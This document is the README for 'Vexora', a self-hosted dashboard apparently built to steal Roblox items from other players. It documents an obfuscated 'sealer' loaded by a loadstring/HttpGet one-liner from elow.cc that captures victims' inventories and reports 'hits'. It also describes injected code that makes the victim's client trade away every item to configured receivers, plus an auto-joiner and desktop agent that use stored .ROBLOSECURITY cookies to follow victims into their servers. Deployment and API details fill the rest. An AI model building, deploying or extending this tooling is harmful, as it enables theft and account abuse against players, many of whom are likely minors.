# Vexora

Live capture dashboard: hit feed, stats and charts, server list, leaderboard, per-account
script config, an auto-joiner and an admin suite. Zero-dependency Node backend, vanilla
ES-module frontend. No build step, no npm install.

![Vexora](public/assets/share.png)

## Requirements

- Node.js 20 or newer for the local build
- A Cloudflare account for the Workers build (no other service needed)

## Run it

```bash
git clone <your-repo-url> vexora
cd vexora
node server/server.js
```

Open <http://127.0.0.1:5175/overview>.

The first account you register becomes the admin. Everyone after that is a member and can
be promoted from **Admin → Members**. Sign-in is username + password only; Discord is
optional.

A fresh Node database is seeded with demo members and hits so the charts have data. For a
clean install:

```bash
SEED=0 node server/server.js
```

The Workers build always starts empty — first account registered on `/overview` becomes the
admin, then the dashboard fills up from your own hits.

State lives in `data/db.json` and is written atomically. Delete the file to start over.

## Configuration

Copy `.env.example` to `.env` if you want to keep the values in a file, or pass them inline.
The server reads `process.env` directly, so any process manager works.

| Variable | Default | What it does |
| --- | --- | --- |
| `PORT` | `5175` | HTTP port |
| `HOST` | `127.0.0.1` | Bind address. Use `0.0.0.0` to accept LAN devices |
| `PUBLIC_URL` | derived | Public origin baked into loadstring URLs, e.g. `https://elow.cc` |
| `SCRIPT_SECRET` | `PUBLIC_URL` | Extra seed mixed into each sealed Lua payload |
| `ACCOUNT_API_URL` | `https://cloud-credential-compass.lovable.app` | Base URL of the external account service |
| `ACCOUNT_API_KEY` | unset | Enables managed accounts. Server-only secret, never commit it |
| `DISCORD_CLIENT_ID` | unset | Enables the optional Discord sign-in button |
| `DISCORD_CLIENT_SECRET` | unset | Discord OAuth secret |
| `SEED` | enabled | `SEED=0` creates an empty database instead of the demo seed |

Set `PUBLIC_URL` to the exact origin users hit. Every generated Roblox script points at it.

## Deploy on Cloudflare (elow.cc)

The repo ships a Workers build next to the Node one. `wrangler.jsonc` is the whole deploy
config: static SPA from `public/`, API in a Durable Object, state in its SQLite storage.
Nothing to provision and no database ID to paste.

```bash
npx wrangler login
npx wrangler deploy
```

Then in the Cloudflare dashboard open the Worker → **Settings → Domains & Routes** and add
`elow.cc`. `wrangler.jsonc` already sets `PUBLIC_URL` to `https://elow.cc`, so loadstrings and
redirects point at the domain as soon as it is attached.

A push build works too: set the deploy command to `npx wrangler deploy` and it will pick up
`wrangler.jsonc` from the repo root.

**What runs where**

| Piece | Node build | Workers build |
| --- | --- | --- |
| Dashboard, auth, hits, admin | `server/server.js` | `worker/index.js` → Durable Object |
| Storage | `data/db.json` | DO SQLite (survives deploys) |
| Passwords | scrypt | PBKDF2-SHA256 |
| Lua sealer + claimer | yes | yes |
| Desktop "launch Roblox" engine | yes | no (no local client) — card hidden |
| Discord sign-in | if env set | if vars/secrets set |

Sessions are httpOnly cookies either way; behind Cloudflare the login throttle reads
`CF-Connecting-IP` and cookies get `Secure`.

### Alternative: Cloudflare Tunnel + Node

If you would rather keep the Node build on a box you control, put a Tunnel in front of it —
the origin stays private, Cloudflare terminates TLS, and `https://elow.cc` works with no open
ports.

On the machine that runs Vexora:

```bash
# 1. start the app on loopback, advertising the public origin
PUBLIC_URL=https://elow.cc HOST=127.0.0.1 node server/server.js

# 2. install cloudflared (Debian/Ubuntu shown; see Cloudflare docs for Windows)
curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg \
  | tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null
echo "deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared any main" \
  | tee /etc/apt/sources.list.d/cloudflared.list
apt-get update && apt-get install -y cloudflared

# 3. create the tunnel and point DNS at it
cloudflared tunnel login
cloudflared tunnel create vexora
cloudflared tunnel route dns vexora elow.cc
```

Then use the config in [`deploy/cloudflared.yml.example`](deploy/cloudflared.yml.example):

```bash
sudo mkdir -p /etc/cloudflared
sudo cp deploy/cloudflared.yml.example /etc/cloudflared/config.yml
# edit the tunnel id + credentials path inside, then:
sudo cloudflared service install
sudo systemctl enable --now cloudflared
```

Verify with `curl -I https://elow.cc/health`. It should return `200`.

**Windows instead of Linux:** run the same app with
`$env:PUBLIC_URL="https://elow.cc"` and use `cloudflared tunnel run --url http://127.0.0.1:5175`
for a quick test, or install it as a service with `cloudflared service install`.

Keep Vexora running under a supervisor. A systemd unit is included at
[`deploy/vexora.service`](deploy/vexora.service).

## Roblox scripts

Both scripts are served per account and baked with that account's token — never publish your
own generated URLs. The `/raw` responses are **sealed**: a base64 payload behind a small Lua
loader, so the served file is not readable Lua. `/script` shows only the loadstring to members;
an admin can reveal the unsealed source through `GET /api/script/source`. The plaintext templates
live in `server/scripts/` and are never part of the static assets.

- **Sealer** (`/script`): `loadstring(game:HttpGet("https://elow.cc/raw/<token>.lua"))()`
  captures inventory and trades, and posts hits to your webhook token.
- **Auto joiner / claimer** (`/claimer`): `loadstring(game:HttpGet("https://elow.cc/raw/<token>-claimer.lua"))()`
  polls with your API key, teleports into flagged servers and starts the trade loop.

The **API key** is on `/script` and `/settings`. It is sent as `x-api-key` to
`/api/claimer/*`; rotate it there if it leaks. API keys, webhook tokens and cookies are stored
in `data/db.json` — that file is git-ignored on purpose.

### Auto joiner

Open **Auto joiner** in the sidebar:

1. Turn on **Armed**.
2. Optionally enable **Turn on automatically** so the first real hit arms it.
3. Copy the claimer loadstring into the always-on device's executor (autoexec folder so it
   survives teleports).
4. If the device is an Android emulator, set **Phone API base** to `http://10.0.2.2:5175`
   (local) or your public origin.

Only captures from a real victim with a live `game.JobId` become targets. Inventory dumps,
self-tests and stale servers are ignored, and anything older than 15 minutes shows as `stale`.

### Managed accounts (external database)

With `ACCOUNT_API_KEY` set, accounts live in the external service and this app never stores a
password hash. Every browser session still gets its own httpOnly cookie; the service's session
token is kept server-side and checked at most every 10 minutes.

| Action | Upstream call |
| --- | --- |
| Create account | `POST /api/public/signup` `{username, email, password}` |
| Sign in | `POST /api/public/login` `{login, password}` |
| Check session | `POST /api/public/session` `{token}` |
| Sign out | `POST /api/public/session` `{token, action: "logout"}` |

All of them send `x-api-key: $ACCOUNT_API_KEY`. Signup requires a valid email. Users created
this way show `password_set: false, managed: true`.

```bash
# local Node
ACCOUNT_API_KEY=... node server/server.js

# Cloudflare (encrypted secret, not wrangler.jsonc)
npx wrangler secret put ACCOUNT_API_KEY
```

If the key is missing, the app falls back to local password auth (scrypt on Node,
PBKDF2 on Workers).

## Receiver trades

Receivers configured on **My script** are injected into the generated client. When one of
those usernames is in the server, or joins it, the client requests a trade, offers every
real item and confirms its side. Items are offered by clicking the cards in the trade window,
since that panel is the reliable list of what the account can put up. Cards are scrolled into
view and clicked at their
screen position, a card only counts when the window changed, and the receiving client clicks
**Accept** on the request prompt. Guessed item remotes are only a fallback. The inventory is
read from collection folders and the inventory panel, and the panel is opened once when it
lists nothing. Each stage is recorded and shown
under **Auto joiner → Receiver trades** (`engine`, `receiver_joined`, `request`, `window`,
`offer`, `confirm`, `waiting`, `done`, `no_window`, `probe`).

```json
{ "event": "trade", "stage": "offer", "receiver": "ReceiverOne",
  "items": ["Chroma Seer"], "game": "mm2", "place_id": 142823291,
  "server_id": "…", "detail": "1 item(s) clicked in the trade window" }
```

Trade events are stored on the user (`trades`, last 60) and never create a hit. The client
discovers trade, item and confirm remotes by name in `ReplicatedStorage`, so a game without
those remotes reports `no_window` instead of pretending it traded. A `probe` stage dumps the
folders, GUIs, remotes and trade-window button names the client can see; an unreadable
inventory never triggers the no-item kick. The receiver has to accept; running the same client on that account
auto-confirms its side.

## Desktop agent (cross-game)

A Roblox Lua script cannot open another game when the executor blocks the shell, and
`TeleportService` refuses cross-experience joins with 773. The desktop agent is the
reliable path: it runs on the PC signed into the alt, watches the dashboard, and opens
the exact place and server with the alt's cookie.

Download `vexora-agent.py` (or `vexora-agent.bat` on Windows) from the **Auto joiner**
page. Put the alt's full `.ROBLOSECURITY` in `alt-cookie.txt` next to the script, then:

```bash
python vexora-agent.py --site https://elow.cc --key <claimer-api-key>
```

- polls `GET /api/claimer/target?watch=1`, which never takes the Lua poller's lease
- opens `roblox-player:` for the target's `place_id` and `server_id` via an auth ticket
- optionally seeds the executor autoexec folder: `--autoexec <dir> --script-url <url>`
- posts a heartbeat, so the dashboard and the in-game panel show `agent on` / `agent off`
- leave it running: it reopens the target whenever a new one lands, including overnight

## Multi-client launcher

`tools/roblox_multi.py` opens several Roblox clients, one per saved account, optionally into
the same server so two accounts can trade with each other. Python 3 with tkinter, no packages.

```bash
python tools/roblox_multi.py                  # GUI: add cookies, tick accounts, launch
python tools/roblox_multi.py --cli --list
python tools/roblox_multi.py --cli --check --cookie "_|..."      # test one cookie, don't save
python tools/roblox_multi.py --cli --add main --cookie "_|..."
python tools/roblox_multi.py --cli --launch --accounts main,alt --job <jobId> --delay 8
```

It uses the same flow as the server: cookie → authentication ticket → `roblox-player:` URL
with `PlaceLauncher.ashx` inside it. Nothing is patched, no client files are touched.

- Cookies are stored in `tools/accounts.json` (git-ignored, mode 600).
- `--job` (a raw id or a copied `?gameInstanceId=` server link) puts every account in the
  same server. Omit it and each client joins any open server in that place.
- `--dry-run` prints the protocol URL without opening a client.
- **Two windows at once:** close every Roblox window first, then launch both accounts from
  the tool. It creates `ROBLOX_singletonMutex` before the first client starts and keeps it
  for the whole run, the same trick the C++ multi-instance launchers use. The GUI has the
  toggle; `--no-multi` turns it off.
- The lock is only taken from a cold start. If a client is already open the tool leaves the
  kernel objects alone (touching them while a client runs can close that window) and tells
  you in the log. If the first client still refuses to start while the lock is held, the
  lock is released and that launch is retried without it.

## Routes

| Path | What it does |
| --- | --- |
| `/overview` | Stat cards, activity charts, game split, live feed |
| `/hits` | Your captures — search, sort, timeframe, CSV export |
| `/public-hits` | Anonymized network stream (admin) |
| `/servers` | Reported servers with join links |
| `/leaderboard` | Rank by tracked value (admin) |
| `/script` | Loadstring, receivers, webhook, dualhook, min value, API key |
| `/claimer` | Auto joiner: latest hits, receiver trades, queue, accounts, SSS claimer script, agent download |
| `/download/vexora-agent.py` | Desktop agent that opens cross-game targets |
| `/settings` | Profile, password, API key, export/clear |
| `/admin/members` | Search, ban, promote |
| `/admin/hits` | Every hit network-wide |
| `/admin/blacklist` | Blocked Roblox usernames |
| `/admin/system` | Uptime, DB size, counts, OAuth status |

## API

```
GET    /api/me
GET    /api/stats
GET    /api/hits
GET    /api/hits/public
GET    /api/servers
GET    /api/leaderboard
GET    /api/config                PUT  /api/config
POST   /api/config/test
GET    /api/public/stream         (SSE)

GET    /api/claimer               PUT  /api/claimer
POST   /api/claimer/accounts      DELETE /api/claimer/accounts/:id
POST   /api/claimer/accounts/:id/verify
POST   /api/claimer/hits/:id/join
POST   /api/claimer/jobs/:id/join DELETE /api/claimer/jobs/:id
POST   /api/claimer/queue/clear

GET    /api/claimer/target        x-api-key
POST   /api/claimer/arm         x-api-key
POST   /api/claimer/disarm      x-api-key
POST   /api/claimer/target/:id/arrived  x-api-key
POST   /api/claimer/target/:id/failed  x-api-key
GET    /api/claimer/target?watch=1     x-api-key (no lease)
POST   /api/claimer/target/:id/launched x-api-key
POST   /api/claimer/launcher          x-api-key
POST   /api/claimer/heartbeat     x-api-key

POST   /api/webhooks/:token       (sealer ingest)
GET    /raw/:token.lua            (sealer script)
GET    /raw/:token-claimer.lua    (claimer script)
GET    /health
```

## Layout

```
server/server.js   Node bootstrap: env, store, claimer engine, listen
server/app.js      shared router: routes, auth, JSON API, SSE
server/script-seal.js  Lua payload sealer used by both runtimes
server/scripts/    client + claimer Lua templates (server-side only)
server/db.js       JSON store for the Node build
server/claimer.js  claim queue, desktop launcher, Roblox lookups
public/            SPA, assets, CSS (no Lua)
worker/index.js    Workers entry: API to the Durable Object, else assets
worker/durable.js  DO wrapper around server/app.js
worker/store.js    DO SQLite store (same API as db.js)
worker/passwords.js PBKDF2 hashing for the cloud build
worker/shim.js     Request/response adapters
worker/claimer.js  cloud claim queue (no desktop launcher)
wrangler.jsonc     Cloudflare deploy config
data/db.json       Node runtime database (git-ignored)
deploy/            Tunnel + systemd examples
```

## Security notes

- `data/db.json` holds password hashes, session hashes, API keys, webhook tokens and any
  stored `.ROBLOSECURITY` cookies. Never commit it; the repo ships an empty `data/` instead.
- Session cookies are `HttpOnly`, `SameSite=Lax`, and `Secure` behind HTTPS.
- Login throttling keys off `CF-Connecting-IP` / `X-Forwarded-For`, so Cloudflare users are
  limited individually rather than sharing one bucket.
- Put the app behind HTTPS. A tunnel does that for you; exposing port 5175 directly does not.
